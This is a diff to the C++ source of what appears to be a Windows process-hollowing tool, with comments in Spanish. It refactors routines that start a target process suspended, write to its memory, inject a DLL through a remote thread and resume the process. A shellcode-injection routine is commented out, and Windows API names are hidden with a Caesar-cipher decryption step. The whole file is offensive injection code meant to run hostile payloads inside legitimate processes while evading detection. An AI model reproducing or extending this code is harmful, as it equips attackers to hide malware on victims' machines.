@@ -4,9 +4,10 @@
 ProcessHollowing::ProcessHollowing() {}
 
 std::string ProcessHollowing::_DecryptFunctionName(std::vector<unsigned char>& encryptedName, unsigned char key) {
-	return Obfuscator::DecryptCaesar(encryptedName, key);
+	return Obfuscator::decryptCaesar(encryptedName, key);
 }
 
+/*
 LPVOID ProcessHollowing::_AllocateRemoteMemory(HANDLE hProcess, SIZE_T size) {
 	LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (remoteMemory == NULL) {
@@ -15,9 +16,7 @@ LPVOID ProcessHollowing::_AllocateRemoteMemory(HANDLE hProcess, SIZE_T size) {
 	}
 
 	return remoteMemory;
-
 }
-
 void ProcessHollowing::_WriteRemoteMemory(HANDLE hProcess, LPVOID remoteAddress, const void* buffer, SIZE_T size) {
 	if (!WriteProcessMemory(hProcess, remoteAddress, buffer, size, NULL)) {
 		std::cerr << "Error escribiendo la ruta del DLL en la memoria remota: " << GetLastError() << std::endl;
@@ -26,15 +25,8 @@ void ProcessHollowing::_WriteRemoteMemory(HANDLE hProcess, LPVOID remoteAddress,
 	}
 }
 
-void  ProcessHollowing::_ResumeProcess(PROCESS_INFORMATION& pi) {
-	if (ResumeThread(pi.hThread) == -1) {
-		std::cerr << "Error al reanudar el proceso suspendido: " << GetLastError() << std::endl;
-		throw std::runtime_error("Error al reanudar el proceso suspendido");
-	}
-	CloseHandle(pi.hProcess);
-	CloseHandle(pi.hThread);
-}
-
+*/
+/*
 LPVOID ProcessHollowing::_GetLoadLibraryAddress() {
 	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
 	if (hKernel32 == NULL) {
@@ -49,6 +41,7 @@ LPVOID ProcessHollowing::_GetLoadLibraryAddress() {
 	}
 	return loadLibraryAddr;
 }
+*/
 
 PROCESS_INFORMATION ProcessHollowing::_CreateSuspendedProcess(const std::string& targetProcess) {
 	STARTUPINFOA si;
@@ -105,7 +98,17 @@ VOID ProcessHollowing::_SetContextAndResumeProcess(HANDLE hProcess, HANDLE hThre
 	api.ResumeThread(hThread);
 }
 
-VOID ProcessHollowing::InjectShellcode(const std::string& targetProcess, const std::vector<unsigned char>& shellcode) {
+void  ProcessHollowing::_ResumeProcess(PROCESS_INFORMATION& pi) {
+	if (ResumeThread(pi.hThread) == -1) {
+		std::cerr << "Error al reanudar el proceso suspendido: " << GetLastError() << std::endl;
+		throw std::runtime_error("Error al reanudar el proceso suspendido");
+	}
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+}
+
+/*
+bool ProcessHollowing::InjectShellcode(const std::string& targetProcess, const std::vector<unsigned char>& shellcode) {
     try {
         // 1. Crear el proceso suspendido
         PROCESS_INFORMATION pi = _CreateSuspendedProcess(targetProcess);
@@ -131,12 +134,13 @@ VOID ProcessHollowing::InjectShellcode(const std::string& targetProcess, const s
         std::cerr << "Error en InjectShellcode: " << e.what() << std::endl;
     }
 }
-
-VOID ProcessHollowing::InjectDLL(const std::string& targetProcess, const std::string& dllPath) {
+*/
+bool ProcessHollowing::InjectDLL(const std::string& targetProcess, const std::string& dllPath) {
 	try {
 		// 1. Crear el proceso suspendido
 		PROCESS_INFORMATION pi = _CreateSuspendedProcess(targetProcess);
 
+		/*
 		// 2. Asignar memoria para la ruta del DLL
 		LPVOID dllPathAddress = _AllocateRemoteMemory(pi.hProcess, dllPath.size() + 1);
 		_WriteRemoteMemory(pi.hProcess, dllPathAddress, dllPath.c_str(), dllPath.size() + 1);
@@ -150,6 +154,12 @@ VOID ProcessHollowing::InjectDLL(const std::string& targetProcess, const std::st
 			throw std::runtime_error("Error creando el hilo remoto");
 		}
 
+
+		*/
+		RemoteThreadDllInjector dllInjector(pi, dllPath);
+		HANDLE hRemoteThread = dllInjector.GetHRemoteThread();
+		HANDLE dllPathAddress = dllInjector.GetDllPathAddress();
+
 		// 5. Esperar a que el hilo termine
 		WaitForSingleObject(hRemoteThread, INFINITE);
 
@@ -160,10 +170,11 @@ VOID ProcessHollowing::InjectDLL(const std::string& targetProcess, const std::st
 		// 7. Reanudar el proceso
 		_ResumeProcess(pi);
 
-		std::cout << "DLL cargada exitosamente." << std::endl;
+		Logger::info("DLL successfully loaded on target " + targetProcess);
+		return true;
 	}
 	catch (const std::exception& e) {
-		std::cerr << "Error en InjectDLL: " << e.what() << std::endl;
+		Logger::error(std::string("Issues loading DLL. Reason: ") + e.what());
 	}
+	return false;
 }
-
